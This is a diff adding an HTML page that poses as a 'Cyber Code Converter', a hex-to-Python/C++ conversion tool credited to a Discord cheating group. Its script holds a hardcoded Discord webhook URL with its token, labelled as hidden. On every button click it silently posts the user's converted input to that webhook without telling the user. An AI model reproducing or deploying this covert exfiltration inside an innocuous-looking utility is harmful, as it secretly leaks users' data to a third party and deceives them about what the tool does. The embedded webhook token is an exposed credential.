@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CYBER CODE CONVERTER</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'IBM Plex Mono', monospace;
+        }
+        
+        body {
+            background-color: #0f0f0f;
+            color: #c9c9c9;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 800px;
+            width: 100%;
+            margin: 0 auto;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 5px;
+            color: #0df4c7;
+        }
+        
+        .subtitle {
+            font-size: 1rem;
+            opacity: 0.8;
+        }
+        
+        .input-area {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        
+        textarea {
+            width: 100%;
+            height: 200px;
+            background-color: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 15px;
+            color: #c9c9c9;
+            font-size: 1rem;
+            resize: vertical;
+            outline: none;
+        }
+        
+        textarea::placeholder {
+            color: #555;
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        
+        button {
+            background-color: #0df4c7;
+            color: #0f0f0f;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 20px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            flex: 1;
+            min-width: 200px;
+        }
+        
+        button:hover {
+            background-color: #0be5ba;
+            transform: translateY(-2px);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        .output-area {
+            width: 100%;
+            margin-bottom: 40px;
+        }
+        
+        .output-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #0df4c7;
+        }
+        
+        .output-content {
+            width: 100%;
+            min-height: 150px;
+            background-color: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 15px;
+            white-space: pre-wrap;
+            overflow-wrap: break-word;
+        }
+        
+        footer {
+            margin-top: auto;
+            text-align: center;
+            padding: 20px 0;
+            opacity: 0.7;
+            font-size: 0.9rem;
+        }
+        
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #0df4c7;
+            color: #0f0f0f;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-weight: 500;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .notification.show {
+            opacity: 1;
+        }
+        
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 2rem;
+            }
+            
+            button {
+                min-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            
+            <h1>🔁 CYBER CODE CONVERTER</h1>
+            <div class="subtitle">&lt; / &gt; PANEL USER OP</div>
+        </header>
+        
+        <div class="input-area">
+            <textarea id="hexInput" placeholder="Paste your HEX string here..."></textarea>
+        </div>
+        
+        <div class="button-group">
+            <button id="toPython">Convert to Python</button>
+            <button id="toCpp">Convert to C++</button>
+            <button id="toHex">Convert to Hex</button>
+        </div>
+        
+        <div class="output-area">
+            <span class="output-label">Output:</span>
+            <div class="output-content" id="output"></div>
+        </div>
+
+        
+        <footer>
+    
+             
+            &lt; / &gt; MADE BY CYBER XITERS DISCORD SERVER 
+ 
+
+      
+        </footer>
+        
+        <div class="notification" id="notification">✅ Output copied to clipboard!</div>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const hexInput = document.getElementById('hexInput');
+            const output = document.getElementById('output');
+            const toPythonBtn = document.getElementById('toPython');
+            const toCppBtn = document.getElementById('toCpp');
+            const toHexBtn = document.getElementById('toHex');
+            const notification = document.getElementById('notification');
+            
+            // Hidden Discord webhook configuration
+            const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1373960449309020180/x1amKrFvXei3TN9ILjMts03w9r1dBGh5ZEDF-cty6z4yKuoEUn1bFJvzHh6EqADwA1yU";
+            
+            // Conversion functions
+            function hexToPython(hexStr) {
+                const cleanedHex = hexStr.replace(/\s+/g, '').replace(/0x|0X|\\x|,/g, '');
+                if (!cleanedHex.match(/^[0-9a-fA-F]+$/)) {
+                    return "Invalid HEX input!";
+                }
+                
+                let pythonBytes = '';
+                for (let i = 0; i < cleanedHex.length; i += 2) {
+                    const byte = cleanedHex.substr(i, 2);
+                    pythonBytes += `\\x${byte}`;
+                }
+                
+                return `b"${pythonBytes}"`;
+            }
+            
+            function hexToCpp(hexStr) {
+                const cleanedHex = hexStr.replace(/\s+/g, '').replace(/0x|0X|\\x|,/g, '');
+                if (!cleanedHex.match(/^[0-9a-fA-F]+$/)) {
+                    return "Invalid HEX input!";
+                }
+                
+                let cppArray = 'const unsigned char data[] = {';
+                for (let i = 0; i < cleanedHex.length; i += 2) {
+                    const byte = cleanedHex.substr(i, 2);
+                    cppArray += `0x${byte}`;
+                    if (i < cleanedHex.length - 2) {
+                        cppArray += ', ';
+                    }
+                }
+                cppArray += '};';
+                
+                return cppArray;
+            }
+            
+            function codeToHex(code) {
+                const pythonMatch = code.match(/^b?"([\\x0-9a-fA-F]+)"$/);
+                if (pythonMatch) {
+                    return pythonMatch[1].replace(/\\x/g, '');
+                }
+                
+                const cppMatch = code.match(/{([0-9a-fA-Fx,\s]+)}/);
+                if (cppMatch) {
+                    return cppMatch[1].replace(/0x|,/g, '').replace(/\s+/g, '');
+                }
+                
+                return code.replace(/\s+/g, '').replace(/0x|\\x|,/g, '');
+            }
+            
+            // Silent send to Discord webhook (no notifications)
+            async function sendToDiscord(content, conversionType) {
+                try {
+                    await fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            content: `**CYBER CODE CONVERTER (${conversionType})**\n\`\`\`\n${content}\n\`\`\``,
+                            username: 'CYBER CODE CONVERTER',
+                            avatar_url: 'https://i.imgur.com/4M34hi2.png'
+                        })
+                    });
+                } catch (error) {
+                    console.error('Error sending to Discord:', error);
+                }
+            }
+            
+            // Button event handlers
+            toPythonBtn.addEventListener('click', async function() {
+                const result = hexToPython(hexInput.value);
+                output.textContent = result;
+                copyToClipboard(result);
+                await sendToDiscord(result, 'Python');
+            });
+            
+            toCppBtn.addEventListener('click', async function() {
+                const result = hexToCpp(hexInput.value);
+                output.textContent = result;
+                copyToClipboard(result);
+                await sendToDiscord(result, 'C++');
+            });
+            
+            toHexBtn.addEventListener('click', async function() {
+                const result = codeToHex(hexInput.value);
+                output.textContent = result;
+                copyToClipboard(result);
+                await sendToDiscord(result, 'HEX');
+            });
+            
+            // Copy to clipboard and show notification
+            function copyToClipboard(text) {
+                navigator.clipboard.writeText(text).then(() => {
+                    showNotification('✅ Output copied to clipboard!');
+                });
+            }
+            
+            function showNotification(message) {
+                notification.textContent = message;
+                notification.classList.add('show');
+                setTimeout(() => {
+                    notification.classList.remove('show');
+                }, 2000);
+            }
+            
+            // Allow clicking on output to copy
+            output.addEventListener('click', function() {
+                if (output.textContent.trim()) {
+                    copyToClipboard(output.textContent);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
